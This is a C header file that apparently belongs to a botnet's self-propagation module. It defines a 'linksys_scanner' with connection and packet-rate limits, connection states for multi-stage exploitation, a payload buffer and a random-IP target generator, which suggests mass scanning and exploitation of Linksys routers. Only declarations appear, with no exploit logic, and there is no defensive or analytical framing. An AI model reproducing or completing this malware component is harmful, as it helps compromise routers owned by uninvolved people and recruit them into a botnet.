#ifdef linksys

#pragma once

#include <stdint.h>

#include "../../h/i.h"

#ifdef X86_64
#define linksys_scanner_MAX_CONNS 512
#define linksys_scanner_RAW_PPS 1440
#else
#define linksys_scanner_MAX_CONNS 256
#define linksys_scanner_RAW_PPS 1024
#endif

#ifdef X86_64
#define linksys_scanner_RDBUF_SIZE 1024
#define linksys_scanner_HACK_DRAIN 64
#else
#define linksys_scanner_RDBUF_SIZE 1024
#define linksys_scanner_HACK_DRAIN 64
#endif

struct linksys_scanner_connection
{
    int fd, last_recv;
    enum
    {
        linksys_scanner_SC_CLOSED,
        linksys_scanner_SC_CONNECTING,
        linksys_scanner_SC_EXPLOIT_STAGE2,
        linksys_scanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[linksys_scanner_RDBUF_SIZE];
    char payload_buf[2024];
};

void linksys_scanner();
void linksys_scanner(void);

static void linksys_scanner_setup_connection(struct linksys_scanner_connection *);
static ipv4_t linksys_scanner_get_random_ip(void);

#endif

